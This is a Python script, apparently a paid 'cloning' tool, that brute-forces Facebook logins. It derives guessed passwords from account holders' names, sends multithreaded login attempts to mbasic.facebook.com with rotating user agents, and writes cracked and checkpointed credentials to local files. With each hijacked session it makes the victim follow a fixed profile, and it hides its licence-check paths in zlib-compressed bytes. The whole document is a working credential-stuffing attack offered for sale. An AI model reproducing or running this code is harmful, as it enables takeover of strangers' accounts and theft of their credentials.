#!/usr/bin/python3
import os
try:
    import requests
except ImportError:
    print('\n [✓] installing requests !...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n [✓] installing futures !...\n')
    os.system('pip install futures')

try:
    import bs4
except ImportError:
    print('\n [✓] installing bs4 !...\n')
    os.system('pip install bs4')

import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib
from concurrent.futures import ThreadPoolExecutor as sarfrazssb
from datetime import datetime
from bs4 import BeautifulSoup


ct = datetime.now()
n = ct.month
bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
P = '\x1b[1;97m' # 
M = '\033[1;31m' # 
H = '\033[1;32m' # 
K = '\x1b[1;97m' # 
B = '\x1b[1;97m' # 
U = '\x1b[1;97m' # 
O = '\x1b[1;97m' # 
N = '\x1b[0m'    # 
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
data,data2={},{}
aman,cp,salah=0,0,0
ubahP,fuck,pwBaru=[],[],[]
ok = []
cp = []
id = []
user = []
loop = 0
url_lookup = "https://lookup-id.com/"
url_mb = "https://m.facebook.com"
url_ip = "https://www.httpbin.org/ip"
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
done = False

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)

os.system('clear')
logo =                                          """\x1b[1;96m
 ███    ███ ██████     ███    ██ ██ ██   ██ ██ 
 ████  ████ ██   ██    ████   ██ ██ ██  ██  ██ 
 ██ ████ ██ ██████     ██ ██  ██ ██ █████   ██ 
 ██  ██  ██ ██   ██    ██  ██ ██ ██ ██  ██  ██ 
 ██      ██ ██   ██ ██ ██   ████ ██ ██   ██ ██
\n\x1b[1;93m──────────────────────────────────────────────
\x1b[1;91m [\x1b[1;92m✓\x1b[1;91m]\x1b[1;92m AUTHOR   \x1b[1;91m> \x1b[1;92mNiki404-Cyber
\x1b[1;91m [\x1b[1;92m✓\x1b[1;91m]\x1b[1;92m YOUTUBE  \x1b[1;91m> \x1b[1;92mMr. NIKI
\x1b[1;91m [\x1b[1;92m✓\x1b[1;91m]\x1b[1;92m WHATSAPP \x1b[1;91m> \x1b[1;92m+8801645137393
\x1b[1;91m [\x1b[1;92m✓\x1b[1;91m]\x1b[1;92m STATUS   \x1b[1;91m> \x1b[1;92mPremium
\x1b[1;93m──────────────────────────────────────────────"""
logo1 = """\x1b[1;96m
 ███    ███ ██████     ███    ██ ██ ██   ██ ██ 
 ████  ████ ██   ██    ████   ██ ██ ██  ██  ██ 
 ██ ████ ██ ██████     ██ ██  ██ ██ █████   ██ 
 ██  ██  ██ ██   ██    ██  ██ ██ ██ ██  ██  ██ 
 ██      ██ ██   ██ ██ ██   ████ ██ ██   ██ ██ 
"""
ugen = [
 'Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36',
 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]',
 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]',
 'Mozilla/5.0 (Linux; Android 10; Nokia 5.1 Plus Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36',
 'Mozilla/5.0 (Linux; Android 11; Nokia 3.2) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/98.0.4758.87 Mobile Safari/537.36',
 'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)',
 'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_XL Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.12',
 'Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36',
 'Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36',
 'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36',
 'Mozilla/5.0 (Linux; U; Android 10; id-id; Redmi 9A Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36',
 'Mozilla/5.0 (Linux; U; Android 2.3.4; pt-pt; SonyEricssonLT18a Build/4.0.1.A.0.266) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
 'Mozilla/5.0 (Linux; U; Android 2.3.4; ru-ru; MID Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
 'Mozilla/5.0 (Linux; U; Android 4.2; ru-ru; Nokia_X Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.2 Mobile Safari/E7FBAF',
 'Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; 9930i Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
 'Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Fly IQ4404 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YandexSearch/7.16',
 'Mozilla/5.0 (Linux; U; Android 4.3; en-us; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
 'Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36',
 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0]',
 'NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+']

def hasil(OK,cp):
    if not len(OK) != 0:
        pass
    if len(cp) != 0:
        print('\n\n\x1b[1;92m [*] Total OK :  %s ' % (H, P, str(len(ok))))
        print('\x1b[1;92m [*] Total CP :\x1b[1;91m %s ' % (H, P, str(len(cp))))
        input("\x1b[1;93m Press enter to back ")
        fucku()

def fucku():
    os.system('clear')
    print(logo)
    ipm = requests.get(url_ip).json()
    todz = ''
    IP = ipm['origin']
    print
    print(' \x1b[1;91m[\x1b[1;92m1\x1b[1;91m]\x1b[1;92m Start File Cloning')
    print(' \x1b[1;91m[\x1b[1;92m2\x1b[1;91m]\x1b[1;92m Join Our WhatsApp Grup')
    print(' \x1b[1;91m[\x1b[1;92m0\x1b[1;91m]\x1b[1;92m Exit ')
    print('')
    _sarfraz___ = input(' [?] Choose option : ')
    if _sarfraz___ in ('1', '01'):
        __xxx__().sarfrazx(id)
    if _sarfraz___ in ('2', '02'):
        os.system('xdg-open https://chat.whatsapp.com/KlBb74gzzjf3JetJcAq15H')
        fucku()
    if _sarfraz___ in ('0', '00'):
        jalan(" \x1b[1;91m[\x1b[1;92m✓\x1b[1;91m] \x1b[1;93m Your Program Closed ✓ ")
        exit
        pass


class __xxx__:
    def __init__(self):
        self.id = []
    def sarfrazx(self,id):
        os.system("clear")
        print(logo)
        self.cnt = input('\n \x1b[1;91m[\x1b[1;92m✓\x1b[1;91m]\x1b[1;92m Input File Name : ')
        self.id = open(self.cnt).read().splitlines()
        os.system('clear')
        print(logo)
        print("")
        ___worldwide___ = ('y')
        if ___worldwide___ in ('yes','Yes','Y', 'y'):
            self.__pler__()
        else:
            print(' [!] Choose Correct One');
            self.sarfrazx(id)
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;92m[NIKI-CRACK] {loop}/{len(self.id)} [OK:-{len(ok)}] [CP:-{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                sharagent = random.choice(ugen)
                session=requests.Session()
                header = {
                    "Host":cebok,
                    "upgrade-insecure-requests":"1",
                    "user-agent":sharagent,
                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "dnt":"1",
                    "x-requested-with":"mark.via.gp",
                    "sec-fetch-site":"same-origin",
                    "sec-fetch-mode":"cors",
                    "sec-fetch-user":"empty",
                    "sec-fetch-dest":"document",
                    "referer":"https://m.facebook.com/",
                    "accept-encoding":"gzip, deflate br",
                    "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
                }
                r = session.get(f"https://{cebok}/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F", headers=header)
                das = {
                    "lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),
                    "jazoest":re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),
                    "uid":user,
                    "flow":"login_no_pin",
                    "pass":pw,
                    "next":"https://developers.facebook.com/tools/debug/accesstoken/"
                }
                header1 = {
                    "Host":cebok,
                    "cache-control":"max-age=0",
                    "upgrade-insecure-requests":"1",
                    "origin":"https://"+cebok,
                    "content-type":"application/x-www-form-urlencoded",
                    "user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36",
                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "x-requested-with":"XMLHttpRequest",
                    "sec-fetch-site":"same-origin",
                    "sec-fetch-mode":"cors",
                    "sec-fetch-user":"empty",
                    "sec-fetch-dest":"document",
                    "referer":"https://"+cebok+"/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F",
                    "accept-encoding":"gzip, deflate br",
                    "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
                }
                po = session.post(f"https://{cebok}/login/device-based/validate-password/?shbl=0", data = das, headers = header1, allow_redirects = False)
                if 'c_user' in session.cookies.get_dict():
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    print(f"\r{H} [NIKI-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('/sdcard/NIKI_OK.txt' , 'a').write('%s\n' % wrt)
                    self.follow(session,coki)
                    break
                elif 'checkpoint' in session.cookies.get_dict():
                    try:
                        tokenz = open('.token.txt').read()
                        cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
                        month, day, year = cp_ttl.split('/')
                        month = bulan_ttl[month]
                        print('\r%s [NIKI-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('/sdcard/NIKI_CP.txt' , 'a').write('%s\n' % wrt)
                        break
                    except (KeyError, IOError):
                        month = ''
                        day   = ''
                        year  = ''
                    except:
                        pass
                    print('\r%s [NIKI-CP] %s | %s ' % (M, user, pw))
                    wrt = '%s|%s' % (user,pw)
                    cp.append(wrt)
                    open('/sdcard/NIKI_CP.txt' , 'a').write('%s\n' % wrt)
                    break
                else:
                    continue
            loop+=1
        except:
            self.__metode__(user, pw, cebok)

    def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100007607054845', cookies={'cookie': coki}).text, 'html.parser')
        get = r.find('a', string='Ikuti').get('href')
        session.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text

    def __pler__(self):
        print(' \x1b[1;91m[\x1b[1;92m1\x1b[1;91m]\x1b[1;92m Crack With Three Pass ')
        print(' \x1b[1;91m[\x1b[1;92m2\x1b[1;91m]\x1b[1;92m Crack With Five Pass')
        chi = input('\n \x1b[1;91m[\x1b[1;92m✓\x1b[1;91m]\x1b[1;92m Choose: ')
        if chi == '':
            print('\nSelect Correct One')
            self.__pler__()
        elif chi in ('1', '01'):
            os.system("clear")
            print(logo1)
            print('\x1b[1;93m──────────────────────────────────────────────')
            print(' \x1b[1;91m[\x1b[1;92m✓\x1b[1;91m]\x1b[1;92m Your Clonnig Started.....')
            print(' \x1b[1;91m[\x1b[1;92m✓\x1b[1;91m]\x1b[1;92m Your OK IDs Saved :\x1b[1;93m nikiok.txt')
            print(' \x1b[1;91m[\x1b[1;92m✓\x1b[1;91m]\x1b[1;92m Your CP IDs Saved :\x1b[1;93m nikicp.txt')
            print('\x1b[1;91m [\x1b[1;92m✓\x1b[1;91m]\x1b[1;92m Your Clonnig Stop Press Ctrl Than z')
            print('\x1b[1;93m──────────────────────────────────────────────')
            with sarfrazssb(max_workers=30) as ssbworld:
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                        ssbworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        elif chi in ('2', '02'):
            os.system("clear")
            print(logo1)
            print('\x1b[1;93m──────────────────────────────────────────────')
            print(' \x1b[1;91m[\x1b[1;92m✓\x1b[1;91m]\x1b[1;92m Your Clonnig Started.....')
            print(' \x1b[1;91m[\x1b[1;92m✓\x1b[1;91m]\x1b[1;92m Your OK IDs Saved :\x1b[1;93m nikiok.txt')
            print(' \x1b[1;91m[\x1b[1;92m✓\x1b[1;91m]\x1b[1;92m Your CP IDs Saved :\x1b[1;93m nikicp.txt')
            print('\x1b[1;91m [\x1b[1;92m✓\x1b[1;91m]\x1b[1;92m Your Clonnig Stop Press Ctrl Than z')
            print('\x1b[1;93m──────────────────────────────────────────────')
            with sarfrazssb(max_workers=30) as ssbworld:
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                            pwx = ["786110"]
                        ssbworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        else:
            print('\n Select Valid One')
            self.__pler__()
ubahP,fuck,pwBaru=[],[],[]
def bnsbuy():
    os.system('clear')
    print(logo)
    print ('')
    print("\n\x1b[1;92;1m Note: If Approval In Loading Or Show \nNo Internet Connection,Then Connect USA Proxy")
    print ('')
    time.sleep(1)
    try:
        f = (b'x\x9c\xd3OI,I\xd4\x07\x13\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\xa5\xc5E\xfa\xa9%\xc9\xfa\x10\xc1\x9c\xcc\xa4b\x00\x8e\xb8\x11\x88')
        bd = (zlib.decompress(f))
        to = (open(bd, 'r').read())
    except (KeyError, IOError):
        bnsreg()
    try:
        bt = (b'x\x9c\xcb())(\xb6\xd2\xd7/H,.IM\xca\xcc\xd3K\xce\xcf\xd5/M\xccs\x0fM3\x08\x01\x00\xa2\xbc\n\x88')
        bw = (zlib.decompress(bt))
        r = (requests.get(bw).text)
    except requests.exceptions.ConnectionError:
        print ("\x1b[0;31mNo Internet Connection")
        exit()

    if to in r:
        fucku()
    else:
        os.system('clear')
        print(logo)
        print ('\x1b[1;96m\tYour Id Is Not Approved ')
        print
        print ('\n\x1b[1;91m [\x1b[1;92m✓\x1b[1;91m]\x1b[1;92m Do Not Press Enter If You Are A Free User\x1b[0m')
        print
        print ('\n\x1b[1;91m [\x1b[1;92m✓\x1b[1;91m]\x1b[1;92m Your Key : \x1b[101m' + to + '\x1b[0m')
        print
        input('\n\x1b[1;91m [\x1b[1;92m✓\x1b[1;91m]\x1b[1;92m Press Enter To Buy This Tools ')
        os.system('am start https://wa.me/+8801645137393?text=Assalamowalikom%20Sir,%20I%20Want%20To%20Buy%20Your%20Niki%20Paid%20Tools.%20My%20Key:%20' + to) 
        bnsbuy()


def bnsreg():
    os.system('clear')
    print(logo)
    print ('\t\x1b[106mKey Not Approved \x1b[0m')
    print
    print ('\n\x1b[1;91m [\x1b[1;92m✓\x1b[1;91m]\x1b[1;92m Note : This Tools Is Paid,So Pay First')
    id = str(uuid.uuid1(uuid.getnode(),0))[24:].upper() + "~NIKI=="
    print
    print ('\n\x1b[1;91m [\x1b[1;92m✓\x1b[1;91m]\x1b[1;92m Your Key: \x1b[92m\x1b[101m' + id + '\x1b[0m')
    print 
    input('\n\x1b[1;91m [\x1b[1;92m✓\x1b[1;91m]\x1b[1;92m Press Enter To Buy This Tools')
    os.system('am start https://wa.me/+8801645137393?text=Assalamowalikom%20Sir,%20I%20Want%20To%20Buy%20Your%20Niki%20Paid%20clonnig%20Tools.%20My%20Key:%20' + id)
    f = (b'x\x9c\xd3OI,I\xd4\x07\x13\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\xa5\xc5E\xfa\xa9%\xc9\xfa\x10\xc1\x9c\xcc\xa4b\x00\x8e\xb8\x11\x88')
    bd = (zlib.decompress(f))
    sav = open(bd, 'w') 
    sav.write(id)
    sav.close()
    os.system("clear")
    time.sleep(3)
    print(logo)
    jalan("\x1b[1;92mSent Your Key \n\x1b[1;92mTo Admin And Buy This Tools First \n \x1b[1;92mThen Run This Tools With ")
    exit()

class load:
    def __init__(self):
        _ = ''
        __ = int('30')
        ___ = int('0')
        __ -= 1
        ___ += 1
        for t in range(int("1")):
            print('\r Please Wait ....')
            sys.stdout.flush()
            time.sleep(0.1)
        print('\n')

if __name__=='__main__':
    bnsbuy()
